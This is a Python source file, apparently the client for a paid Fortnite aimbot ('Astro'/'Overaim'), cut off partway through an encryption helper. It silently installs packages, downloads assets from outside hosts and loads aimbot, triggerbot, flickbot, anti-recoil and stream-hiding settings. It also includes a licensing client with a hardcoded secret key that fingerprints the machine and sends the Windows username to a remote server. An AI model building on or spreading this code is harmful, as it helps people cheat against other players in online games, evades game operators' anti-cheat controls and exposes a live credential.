import os
import base64

os.system("cls")
os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"
import sys
sys.dont_write_bytecode = True
import ctypes
import zipfile
import urllib.request
user32 = ctypes.WinDLL("user32")
kernel32 = ctypes.windll.kernel32
kernel32.SetConsoleMode(kernel32.GetStdHandle(-10), 128)
import time
version = ".".join(map(str, sys.version_info[:3]))
if version not in ["3.11.0", "3.11.9"]:
    input("[Overaim] -> make sure you have uninstalled ALL your other python versions!")
    exit()

current_directory = os.getcwd()
os.system('mode 80,20')
Visual_Outlines = False

def restart_program():
    print("[overaim] -> restarting, please wait...")
    python = sys.executable
    os.execv(python, ['python'] + sys.argv)

def install_process():
    print("\n[Astro] -> please wait...\n")
    #os.system('python -m pip --no-cache-dir --disable-pip-version-check install --upgrade pip setuptools wheel >nul 2>&1')
    modules = [
        "numpy==1.25.2",
        "pygame",
        "opencv-python",
        "PyQt5",
        "mss",
        "requests",
        "matplotlib --prefer-binary",
        "ultralytics",
        "pandas",
        "Pillow",
        "PyYAML",
        "scipy",
        "seaborn",
        "tqdm",
        "psutil",
        "wmi",
        "onnxruntime==1.15",
        "onnxruntime_gpu",
        "comtypes",
        "torch==2.3.1+cu118 -f https://download.pytorch.org/whl/torch_stable.html",
        "torchvision==0.18.1+cu118 -f https://download.pytorch.org/whl/torch_stable.html",
        "observable",
    ]

    total_modules = len(modules)
    xxx = 1
    for module in modules:
        print(f"[Astro] -> installing: {module} ({int((xxx/total_modules)*100)}%)")
        xxx+=1
        os.system(f'py -m pip --no-cache-dir --disable-pip-version-check install {module} >nul 2>&1')
        os.system("cls")


    #os.system('pip --no-cache-dir --disable-pip-version-check install --upgrade ultralytics >nul 2>&1')
    print("[Astro] -> successfuly installed packages")
    print("\n[Astro] -> restarting program...")
    time.sleep(1)
    restart_program()

try:
    import wmi
    import torch
    import ultralytics
    import matplotlib
    import pygame
    import onnxruntime
    import comtypes
    from PyQt5.QtCore import Qt, QSize
    import cv2
    import json as jsond
    import math
    import mss
    import numpy as np
    import time
    import webbrowser
    from ultralytics import YOLO
    import random
    from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QPushButton, QVBoxLayout, QSlider, QHBoxLayout, QCheckBox, QFrame, QStackedWidget, QComboBox
    from PyQt5.QtGui import QPainter, QColor, QPen, QIcon, QFont, QPixmap, QImage, QFontDatabase, QPainterPath, QRegion, QBrush, QPolygon
    from PyQt5.QtCore import Qt, QTimer, QRectF, QRect, QPoint
    import win32con
    import win32api
    from win32file import *
    from win32ui import *
    from win32con import *
    from win32gui import *
    import requests
    if os.name == 'nt':
        import win32security
    from Crypto.Cipher import AES
    from Crypto.Hash import SHA256
    from Crypto.Util.Padding import pad, unpad
    import win32gui
    import threading
    import binascii
    from uuid import uuid4
    import hashlib
    import platform
    import datetime
    from datetime import datetime
    import subprocess
    import psutil
    import string
    from pathlib import Path
    import winsound
    import pygame
    import socket
    # import queue
    # import hmac
    import wmi
    import colorsys
    import shutil
except Exception as e:
    print(e)
    install_process()

try:
    import extra.gfx.dxshot as bettercam
except:
    import gfx.dxshot as bettercam
random_caption1 = ''.join(random.choices(string.ascii_lowercase, k=8))
random_caption2 = ''.join(random.choices(string.ascii_lowercase, k=8))
random_caption3 = ''.join(random.choices(string.ascii_lowercase, k=8))
im = [
    ('https://i.ibb.co/vdhMn3S/x.png', 'C:/ProgramData/NVIDIA/NGX/models/config/x.png'),
    ('https://i.ibb.co/8sGmJfZ/o.png', 'C:/ProgramData/NVIDIA/NGX/models/config/o.png'),
    ('https://i.ibb.co/YhX6sXH/d.png', 'C:/ProgramData/NVIDIA/NGX/models/config/d.png'),
    ('https://api.velocity.ws/assets/Fortnite.ttf', 'C:/ProgramData/Astro/Assets/Font.ttf')
]

for url, path in im: 
    directory = os.path.dirname(path)
    if not os.path.exists(directory):
        os.makedirs(directory)

    if not os.path.exists(path):
        with requests.get(url, stream=True) as response, open(path, 'wb') as file:
            shutil.copyfileobj(response.raw, file)
path1 = r'C:\\ProgramData\\Astro\Assets\\Images\skull.png'
path2 = r'C:\\ProgramData\\Astro\Assets\\Images\skull-highlighted.png'

if not os.path.exists(path1) or not os.path.exists(path2):
    print("[Astro] -> downloading assets...")
    zip_path = r'C:\ProgramData\Astro\Assets\images.zip'
    with open(zip_path, 'wb') as f:
        f.write(requests.get('https://api.velocity.ws/download/images').content)

    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(r'C:\ProgramData\Astro\Assets')

    try:
        os.remove(zip_path)
    except Exception as e:
        print(f"[Astro] -> error removing zip file: {e}")
# with open('extra\config.json', 'r') as file:
# 	config = jsond.load(file)
# 	Fov_Size = config['Fov_Size']
# 	Confidence = config['Confidence']
# 	Aim_Smooth = config['Aim_Smooth']
# 	Max_Detections = config['Max_Detections']
# 	Aim_Bone = config['Aim_Bone']
# 	Enable_Aim = config['Enable_Aim']
# 	Enable_Slots = config['Enable_Slots']
# 	Controller_On = config['Controller_On']
# 	Keybind = config['Keybind']
# 	Keybind2 = config['Keybind2']
# 	Enable_TriggerBot = config['Enable_TriggerBot']
# 	Show_Fov = config['Show_Fov']
# 	Show_Crosshair = config['Show_Crosshair']
# 	Show_Debug = config['Show_Debug']
# 	Auto_Fire_Fov_Size = config['Auto_Fire_Fov_Size']
# 	Show_Detections = config['Show_Detections']
# 	Show_Aimline = config['Show_Aimline']
# 	Auto_Fire_Confidence = config['Auto_Fire_Confidence']
# 	Auto_Fire_Keybind = config['Auto_Fire_Keybind']
# 	Require_Keybind = config['Require_Keybind']
# 	Use_Hue = config['Use_Hue']
# 	CupMode_On = config['CupMode_On']
# 	Reduce_Bloom = config['Reduce_Bloom']
# 	Require_ADS = config['Require_ADS']
# 	AntiRecoil_On = config['AntiRecoil_On']
# 	AntiRecoil_Strength = config['AntiRecoil_Strength']
# 	Theme_Hex_Color = config['Theme_Hex_Color']
# 	Enable_Flick_Bot = config['Enable_Flick_Bot']
# 	Flick_Scope_Sens = config['Flick_Scope_Sens']
# 	Flick_Cooldown = config['Flick_Cooldown']
# 	Flick_Delay = config['Flick_Delay']
# 	Flickbot_Keybind = config['Flickbot_Keybind']

# 	Enable_Aim_Slot1 = config['Enable_Aim_Slot1']
# 	Enable_Aim_Slot2 = config['Enable_Aim_Slot2']
# 	Enable_Aim_Slot3 = config['Enable_Aim_Slot3']
# 	Enable_Aim_Slot4 = config['Enable_Aim_Slot4']
# 	Enable_Aim_Slot5 = config['Enable_Aim_Slot5']

# 	Slot1_Keybind = config['Slot1_Keybind']
# 	Slot2_Keybind = config['Slot2_Keybind']
# 	Slot3_Keybind = config['Slot3_Keybind']
# 	Slot4_Keybind = config['Slot4_Keybind']
# 	Slot5_Keybind = config['Slot5_Keybind']
# 	Slot6_Keybind = config['Slot6_Keybind']

# 	Fov_Size_Slot1 = config['Fov_Size_Slot1']
# 	Fov_Size_Slot2 = config['Fov_Size_Slot2']
# 	Fov_Size_Slot3 = config['Fov_Size_Slot3']
# 	Fov_Size_Slot4 = config['Fov_Size_Slot4']
# 	Fov_Size_Slot5 = config['Fov_Size_Slot5']

# 	RGBOL_Value = config['RGBA_Value']
# 	redr2d2 = RGBOL_Value['red']
# 	greenr2d2 = RGBOL_Value['green']
# 	bluer2d2 = RGBOL_Value['blue']
# 	conf_opacity = RGBOL_Value['opacity']
# 	conf_lightness = RGBOL_Value['lightness']
# 	Use_Model_Class = config['Use_Model_Class']
# 	Img_Value = config['Img_Value']
# 	Model_FPS = config['Model_FPS']
# 	Last_Model = config['Last_Model']
try:
    file = open('./config.json')
    config = jsond.load(file)
    Fov_Size = config['Fov_Size']
    Confidence = config['Confidence']
    Aim_Smooth = config['Aim_Smooth']
    Max_Detections = config['Max_Detections']
    Aim_Bone = config['Aim_Bone']
    Smoothing_Type = config['Smoothing_Type']
    Box_type = config['Box_type']
    Enable_Aim = config['Enable_Aim']
    Enable_Slots = config['Enable_Slots']
    Controller_On = config['Controller_On']
    Keybind = config['Keybind']
    Keybind2 = config['Keybind2']
    Enable_TriggerBot = config['Enable_TriggerBot']
    Show_Fov = config['Show_Fov']
    Show_Crosshair = config['Show_Crosshair']
    Show_Debug = config['Show_Debug']
    Show_FPS = config['Show_FPS']
    Auto_Fire_Fov_Size = config['Auto_Fire_Fov_Size']
    Show_Detections = config['Show_Detections']
    Show_Aimline = config['Show_Aimline']
    Auto_Fire_Confidence = config['Auto_Fire_Confidence']
    Auto_Fire_Keybind = config['Auto_Fire_Keybind']
    Require_Keybind = config['Require_Keybind']
    Use_Hue = config['Use_Hue']
    CupMode_On = config['CupMode_On']
    Reduce_Bloom = config['Reduce_Bloom']
    Require_ADS = config['Require_ADS']
    AntiRecoil_On = config['AntiRecoil_On']
    AntiRecoil_Strength = config['AntiRecoil_Strength']
    #Theme_Hex_Color = config['Theme_Hex_Color']
    Enable_Flick_Bot = config['Enable_Flick_Bot']
    Flick_Scope_Sens = config['Flick_Scope_Sens']
    Flick_Cooldown = config['Flick_Cooldown']
    Flick_Delay = config['Flick_Delay']
    Flickbot_Keybind = config['Flickbot_Keybind']
    Streamproof = False
    Enable_Aim_Slot1 = config['Enable_Aim_Slot1']
    Enable_Aim_Slot2 = config['Enable_Aim_Slot2']
    Enable_Aim_Slot3 = config['Enable_Aim_Slot3']
    Enable_Aim_Slot4 = config['Enable_Aim_Slot4']
    Enable_Aim_Slot5 = config['Enable_Aim_Slot5']
    Slot1_Keybind = config['Slot1_Keybind']
    Slot2_Keybind = config['Slot2_Keybind']
    Slot3_Keybind = config['Slot3_Keybind']
    Slot4_Keybind = config['Slot4_Keybind']
    Slot5_Keybind = config['Slot5_Keybind']
    Slot6_Keybind = config['Slot6_Keybind']
    Fov_Size_Slot1 = config['Fov_Size_Slot1']
    Fov_Size_Slot2 = config['Fov_Size_Slot2']
    Fov_Size_Slot3 = config['Fov_Size_Slot3']
    Fov_Size_Slot4 = config['Fov_Size_Slot4']
    Fov_Size_Slot5 = config['Fov_Size_Slot5']

    Use_Model_Class = config['Use_Model_Class']
    Img_Value = config['Img_Value']
    Model_FPS = config['Model_FPS']
    Last_Model = config['Last_Model']
except Exception as e:
    os.makedirs('./', exist_ok=True)
    with open('./config.json', 'w') as file:
        jsond.dump({
    "Fov_Size": 350,
    "Confidence": 75,
    "Aim_Smooth": 80,
    "Max_Detections": 1,
    "Aim_Bone": "Head",
    "Smoothing_Type": "Default",
    "Box_type": "Regular",
    "Enable_Aim": False,
    "Enable_Slots": False,
    "Controller_On": False,
    "Keybind": 6,
    "Keybind2": 80,
    "Enable_TriggerBot": False,
    "Show_Fov": False,
    "Show_Crosshair": False,
    "Show_Debug": False,
    "Show_FPS": False,
    "Auto_Fire_Fov_Size": 20,
    "Show_Detections": False,
    "Show_Aimline": False,
    "Auto_Fire_Confidence": 60,
    "Auto_Fire_Keybind": 6,
    "Require_Keybind": False,
    "Use_Hue": False,
    "CupMode_On": False,
    "Reduce_Bloom": False,
    "Require_ADS": False,
    "AntiRecoil_On": False,
    "AntiRecoil_Strength": 1,
    "Theme_Hex_Color": "#717fd1",
    "Enable_Flick_Bot": False,
    "Flick_Scope_Sens": 50,
    "Flick_Cooldown": 0.25,
    "Flick_Delay": 0.003,
    "Flickbot_Keybind": 5,
    "Streamproof": False,
    "Enable_Aim_Slot1": False,
    "Enable_Aim_Slot2": False,
    "Enable_Aim_Slot3": False,
    "Enable_Aim_Slot4": False,
    "Enable_Aim_Slot5": False,
    "Slot1_Keybind": 49,
    "Slot2_Keybind": 50,
    "Slot3_Keybind": 51,
    "Slot4_Keybind": 52,
    "Slot5_Keybind": 53,
    "Slot6_Keybind": 80,
    "Fov_Size_Slot1": 800,
    "Fov_Size_Slot2": 120,
    "Fov_Size_Slot3": 800,
    "Fov_Size_Slot4": 120,
    "Fov_Size_Slot5": 800,
    "Use_Model_Class": True,
    "Img_Value": "640",
    "Model_FPS": 165,
    "Last_Model": "Fortnite.pt",
    "game": {
        "pixel_increment": 1000,
        "randomness": 0.25,
        "sensitivity": 0.005,
        "distance_to_scale": 100,
        "dont_launch_overlays": 0,
        "use_mss": 0,
        "hide_masks": 0
    }
}, file, indent=4)
# RGBOL_Value = config['RGBA_Value']
# redr2d2 = RGBOL_Value['red']
# greenr2d2 = RGBOL_Value['green']
# bluer2d2 = RGBOL_Value['blue']

#SECRET CONFIG
secretfile = open('./config.json')
secretconfig = jsond.load(secretfile)["game"]
pixel_increment = secretconfig['pixel_increment']
randomness = secretconfig['randomness']
sensitivity = secretconfig['sensitivity']
distance_to_scale = secretconfig['distance_to_scale']
dont_launch_overlays = secretconfig['dont_launch_overlays']
use_mss = secretconfig['use_mss']
hide_masks = secretconfig['hide_masks']

screensize = {'1920': ctypes.windll.user32.GetSystemMetrics(0), '1080': ctypes.windll.user32.GetSystemMetrics(1)}
screen_res_X = screensize['1920'] # Horizontal
screen_res_Y = screensize['1080'] # Vertical

print(f"Screen Resolution: {screen_res_X, screen_res_Y}")

screen_x = int(screen_res_X / 2) 
screen_y = int(screen_res_Y / 2)

name = "Mirokivela22's Application"  # This should be the **name** of your app
ownerid = "XWEHEhPIuK"               # This should be the **ownerid** (a short ID, not the app name)
secret = "c71b36b8398f66765c9de80c730d3be053c51b5a2baa2c3fb2625cb765dee7e6"  # This is the **secret** key
version = "1.0"                       # This is the **version** of your app, like "1.0"
hash_to_check = "YourHashToCheck"     # You can add your hash value here if needed


class api:

    name = ownerid = secret = version = hash_to_check = ""

    def __init__(self, name, ownerid, secret, version, hash_to_check):
        self.name = name

        self.ownerid = ownerid

        self.secret = secret

        self.version = version
        self.hash_to_check = hash_to_check
        self.init()
    sessionid = enckey = ""
    initialized = False



    def init(self):

        if self.sessionid != "":
            pass
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        self.enckey = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("init".encode()),
            "ver": encryption.encrypt(self.version, self.secret, init_iv),
            "hash": self.hash_to_check,
            "enckey": encryption.encrypt(self.enckey, self.secret, init_iv),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }



        response = self.__do_request(post_data)

        if response == "KeyAuth_Invalid":
            print("The application doesn't exist")
            os._exit(1)

        response = encryption.decrypt(response, self.secret, init_iv)
        json = jsond.loads(response)

        if json["message"] == "invalidver":
            if json["download"] != "":
                ctypes.windll.user32.MessageBoxW(0, "Please install the newest update.", "Out-dated Version!", 64)
                download_link = json["download"]
                os.system(f"start {download_link}")
                os._exit(1)
            else:
                print("Invalid Version, Contact owner to add download link to latest app version")
                os._exit(1)

        if not json["success"]:
            print(json["message"])
            os._exit(1)

        self.sessionid = json["sessionid"]
        self.initialized = True
        self.__load_app_data(json["appinfo"])

    def register(self, user, password, license, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("register".encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "pass": encryption.encrypt(password, self.enckey, init_iv),
            "key": encryption.encrypt(license, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            print("successfully registered")
            self.__load_user_data(json["info"])
        else:
            print(json["message"])
            os._exit(1)

    def upgrade(self, user, license):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("upgrade".encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "key": encryption.encrypt(license, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            print("successfully upgraded user")
            print("please restart program and login")
            time.sleep(2)
            os._exit(1)
        else:
            print(json["message"])
            os._exit(1)

    def login(self, user, password, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("login".encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "pass": encryption.encrypt(password, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            self.__load_user_data(json["info"])
            print("successfully logged in")
        else:
            print(json["message"])
            os._exit(1)

    def license(self, key, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("license".encode()),
            "key": encryption.encrypt(key, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)
        print(f"[Astro] -> {json['message']}")
        if json["success"]:
            try:
                self.__load_user_data(json["info"])
            except:
                exit(99)

            print("\n[Astro] -> launching...")

            global xxxx
            xxxx = Ai992()
            xxxx.start()


    def var(self, name):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("var".encode()),
            "varid": encryption.encrypt(name, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            return json["message"]
        else:
            print(json["message"])
            time.sleep(5)
            os._exit(1)

    def getvar(self, var_name):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("getvar".encode()),
            "var": encryption.encrypt(var_name, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return json["response"]
        else:
            print(json["message"])
            time.sleep(5)
            os._exit(1)

    def setvar(self, var_name, var_data):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify("setvar".encode()),
            "var": encryption.encrypt(var_name, self.enckey, init_iv),
            "data": encryption.encrypt(var_data, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            print(json["message"])
            time.sleep(5)
            os._exit(1)

    def ban(self):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify("ban".encode()),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            print(json["message"])
            time.sleep(5)
            os._exit(1)

    def file(self, fileid):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("file".encode()),
            "fileid": encryption.encrypt(fileid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if not json["success"]:
            print(json["message"])
            time.sleep(5)
            os._exit(1)
        return binascii.unhexlify(json["contents"])

    def webhook(self, webid, param, body = "", conttype = ""):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("webhook".encode()),
            "webid": encryption.encrypt(webid, self.enckey, init_iv),
            "params": encryption.encrypt(param, self.enckey, init_iv),
            "body": encryption.encrypt(body, self.enckey, init_iv),
            "conttype": encryption.encrypt(conttype, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return json["message"]
        else:
            print(json["message"])
            time.sleep(5)
            os._exit(1)

    def check(self):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("check").encode()),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            return True
        else:
            return False

    def checkblacklist(self):
        self.checkinit()
        hwid = others.get_hwid()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify("checkblacklist".encode()),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            return True
        else:
            return False

    def log(self, message):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("log".encode()),
            "pcuser": encryption.encrypt(os.getenv('username'), self.enckey, init_iv),
            "message": encryption.encrypt(message, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        self.__do_request(post_data)

    def fetchOnline(self):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("fetchOnline").encode()),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            if len(json["users"]) == 0:
                return None
            else:
                return json["users"]
        else:
            return None

    def fetchStats(self):
        self.checkinit()

        post_data = {
            "type": "fetchStats",
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            self.__load_app_data(json["appinfo"])

    def chatGet(self, channel):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("chatget".encode()),
            "channel": encryption.encrypt(channel, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            return json["messages"]
        else:
            return None

    def chatSend(self, message, channel):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("chatsend".encode()),
            "message": encryption.encrypt(message, self.enckey, init_iv),
            "channel": encryption.encrypt(channel, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            return False

    def checkinit(self):
        if not self.initialized:
            print("[Astro] -> initialize first in order to use the functions")
            time.sleep(2)
            os._exit(1)

    def __do_request(self, post_data):
        try:
            rq_out = requests.post(
                "https://keyauth.win/api/1.0/", data=post_data, timeout=30
            )
            return rq_out.text

        except requests.exceptions.SSLError:
            caption = "Error 0200: SSLError"
            message = (
                "Your Internet Provider is Blocking our Auth Server.\n\n"
                "To fix this issue, follow these steps below: "
                "After closing this window you will be redirected to a website (warp/cloudflare) "
                "Download the file and turn on WARP (not cloudflare) before launching Astro.AI.\n"
                "Thank you for choosing Astro.AI!"
            )
            message_type = 0x10
            ctypes.windll.user32.MessageBoxW(0, message, caption, message_type)

            webbrowser.open('https://1.1.1.1/', new=2)
            time.sleep(0.2)
            try:
                console_window = ctypes.windll.kernel32.GetConsoleWindow()
                ctypes.windll.user32.PostMessageW(console_window, 0x10, 0, 0)
            except:
                try:
                    sys.exit()
                except:
                    os.system('taskkill /f /fi "imagename eq cmd.exe" 1>NUL 2>NUL')

        except requests.exceptions.Timeout:
            caption = "Error!"
            message = (
                "Request timed out."
            )
            message_type = 0x10
            ctypes.windll.user32.MessageBoxW(0, message, caption, message_type)

            webbrowser.open('https://discord.gg/zuGkMQ37px', new=2)
            time.sleep(0.2)
            try:
                console_window = ctypes.windll.kernel32.GetConsoleWindow()
                ctypes.windll.user32.PostMessageW(console_window, 0x10, 0, 0)
                #event.accept()
            except:
                try:
                    sys.exit()
                except:
                    os.system('taskkill /f /fi "imagename eq cmd.exe" 1>NUL 2>NUL')

    class application_data_class:
        numUsers = numKeys = app_ver = customer_panel = onlineUsers = ""

    class user_data_class:
        username = ip = hwid = expires = createdate = lastlogin = subscription = subscriptions = ""

    user_data = user_data_class()
    app_data = application_data_class()

    def __load_app_data(self, data):
        self.app_data.numUsers = data["numUsers"]
        self.app_data.numKeys = data["numKeys"]
        self.app_data.app_ver = data["version"]
        self.app_data.customer_panel = data["customerPanelLink"]
        self.app_data.onlineUsers = data["numOnlineUsers"]

    def __load_user_data(self, data):
        self.user_data.username = data["username"]
        self.user_data.ip = data["ip"]
        self.user_data.hwid = data["hwid"]
        self.user_data.expires = data["subscriptions"][0]["expiry"]
        self.user_data.createdate = data["createdate"]
        self.user_data.lastlogin = data["lastlogin"]
        self.user_data.subscription = data["subscriptions"][0]["subscription"]
        self.user_data.subscriptions = data["subscriptions"]

class others:
    @staticmethod
    def get_hwid():
        if platform.system() == "Linux":
            with open("/etc/machine-id") as f:
                hwid = f.read()
                return hwid
        elif platform.system() == 'Windows':
            try:
                c = wmi.WMI()
                for disk in c.Win32_DiskDrive():
                    if 'PHYSICALDRIVE' in disk.DeviceID:
                        pnp_device_id = disk.PNPDeviceID
                        return pnp_device_id
            except:
                winuser = os.getlogin()
                sid = win32security.LookupAccountName(None, winuser)[0]
                hwid = win32security.ConvertSidToStringSid(sid)
                return hwid
        elif platform.system() == 'Darwin':
            output = subprocess.Popen("ioreg -l | grep IOPlatformSerialNumber", stdout=subprocess.PIPE, shell=True).communicate()[0]
            serial = output.decode().split('=', 1)[1].replace(' ', '')
            hwid = serial[1:-2]
            return hwid

class encryption:
    @staticmethod
    def encrypt_string(plain_text, key, iv):
        plain_text = pad(plain_text, 16)

        aes_instance = AES.new(key, AES.MODE_CBC, iv)

        raw_out = aes_instance.encrypt(plain_text)

        return binascii.hexlify(raw_out)

    @staticmethod
    def decrypt_string(cipher_text, key, iv):
        cipher_text = binascii.unhexlify(cipher_text)

        aes_instance = AES.new(key, AES.MODE_CBC, iv)

        cipher_text = aes_instance.decrypt(cipher_text)

        return unpad(cipher_text, 16)

    @staticmethod
    def encrypt(message, enc_key, iv):
        try:
            _key = SHA256.new(enc_key.encode()).hexdigest()[:32]

            _iv = SHA256.new(iv.encode()).hexdigest()[:16]

            return encryption.encrypt_string(message.encode(), _key.encode(), _iv.encode()).decode()
        except:
            print("Invalid Application Information. Long text is secret short text is ownerid. Name is supposed to be app name not username")
            os._exit(1)

    @staticmethod
    def decrypt(message, enc_key, iv):
        try:
            _key = SHA256.new(enc_key.encode()).hexdigest()[:32]

            _iv = SHA256.new(iv.encode()).hexdigest()[:16]

            return encryption.decrypt_string(message.encode(), _key.encode(), _iv.encode()).decode()
        except:
